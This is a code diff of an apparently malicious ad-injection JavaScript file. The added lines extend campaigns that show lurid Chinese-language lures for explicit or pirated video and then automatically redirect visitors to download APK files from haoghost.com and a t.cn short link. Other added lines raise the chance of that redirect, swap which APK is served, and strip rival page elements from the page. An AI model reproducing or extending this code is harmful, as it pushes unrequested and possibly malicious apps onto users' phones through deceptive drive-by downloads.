@@ -60,12 +60,19 @@ var hy_itv=setInterval(function(){
 		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"];
 		aztooltip=["","","","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
 	}
+
+	if(num==31)
+	{
+		azimgs=["wb_b3.gif","wb_b5.gif","wb_b2.gif"];
+		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num];
+		aztooltip=["","",""];
+	}
 	
 
 	//正在下载娇羞小苹果,少妇的秘密尽在其中 正在下载书旗小说,千万图书库离线观看
 
 	var alen=azimgs.length;
-	if(num==24||num==25||num==26 || num==16) isup=1;
+	if(num==24||num==25||num==26 || num==29 || num==31) isup=1;
 	function getNum(){
 		var num=parseInt(getCookie("hy_visit_time"));
 		if(isNaN(num))
@@ -137,8 +144,8 @@ var hy_itv=setInterval(function(){
 				var rd=Math.random();
 				//if(notNight()) result="sybb.10C352.apk";
 				//else result="http://t.cn/R7qFBqD";
-				if(rd>0.7) result="http://t.cn/R7qFBqD";
-				else result="360sqyy746.apk";
+				if(rd>0.5) result="http://t.cn/R7qFBqD";
+				else result="sybb.10C352.apk";
 		}
 		return result;
 	}
@@ -226,7 +233,7 @@ var hy_itv=setInterval(function(){
 			tj.appendChild(script);
 		})()		
 
-		if(num==24 || num==25 || num==26 || num==16)
+		if(num==24 || num==25 || num==26 || num==29 || num==31)
 		{
 			t1.style.display="none";
 		}
@@ -281,7 +288,7 @@ var hy_itv=setInterval(function(){
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy6.apk";
+								pname="hlyy9.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_889&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
@@ -306,13 +313,13 @@ var hy_itv=setInterval(function(){
 			}
 			function goCityDown(){
 				window.setTimeout(function(){
-					if(num==18 || num==19)
+					if(num==18 || num==19 || num==31)
 					{
 						if(tt.indexOf("》")<0 || !autoDown()) return;
 						tt=tt.split("》")[0]+"》";
 						tt="正在为您下载播放器，安装后即可观看"+tt;
 					} 
-					else if(num==15 || num==28)
+					else if(num==15 || num==28 || num==29)
 					{
 						if(!autoDown()) return;
 						tt="正在下载神奇影院，海量视频任你看";
@@ -348,7 +355,7 @@ var hy_itv=setInterval(function(){
 							if(pname.indexOf("http")>=0) window.location.href=pname;
 							else window.location.href="http://d.haoghost.com/"+pname;
 							setCookie("hycpc1","1");
-							if(num==28) setBefore();
+							if(num==28 || num==31) setBefore();
 						}
 						else
 						{
@@ -361,7 +368,7 @@ var hy_itv=setInterval(function(){
 			
 		})();
 
-		if(num==18 || num==19 || num==27 || num==22)
+		if(num==18 || num==19 || num==27 || num==22 || num==31)
 		{
 			
 			window.setInterval(function(){
@@ -369,6 +376,11 @@ var hy_itv=setInterval(function(){
 				{
 					var o27div=document.getElementById("lgVshow");
 					if(o27div) o27div.parentNode.removeChild(o27div);
+				}
+				if(num==31)
+				{
+					var o31div=document.getElementById("xcy_fmt_9v");
+					if(o31div) o31div.parentNode.removeChild(o31div);
 				}
 				if(num==22)
 				{
